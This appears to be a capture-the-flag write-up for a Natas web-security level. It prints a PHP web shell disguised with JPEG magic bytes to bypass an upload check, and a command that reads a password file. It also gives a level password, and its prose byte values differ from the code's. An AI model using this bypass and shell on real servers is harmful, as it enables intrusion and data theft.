This page is identical to the previous level, but with 'For security reasons, we now only accept image files!' added.

Looking at the source code, the only major difference is the following 2 lines:
```php
} else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
    echo "File is not an image";
```

If we can find some way to bypass the exif_imagetype check, we can simply upload a PHP file like last time and have that execute whatever code we wish.

After a bit of searching, I came to find info on [file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures).

Looking up the information for exif file signatures, I found that I could insert `FF D8 FF E1` at the start of my `test.php` file in a hex editor, and the system would identify it as a jpeg.

To save you from looking at my solution for Natas 12, here is the code in the php file:
```php
\FF\D8\FF\D1\00\00<?php
 if(isset($_REQUEST['cmd'])){
 echo "<pre>";
 $cmd = ($_REQUEST['cmd']);
 system($cmd);
 echo "</pre>";
 die;
 }
 ?>
  ```

From there, I simply uploaded the file as usual, changed the extension to php in Burp before the server received it, and added my `?cmd= cat /etc/natas_webpass/natas14` at the end of the browser URL for my uploaded file.

Password: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
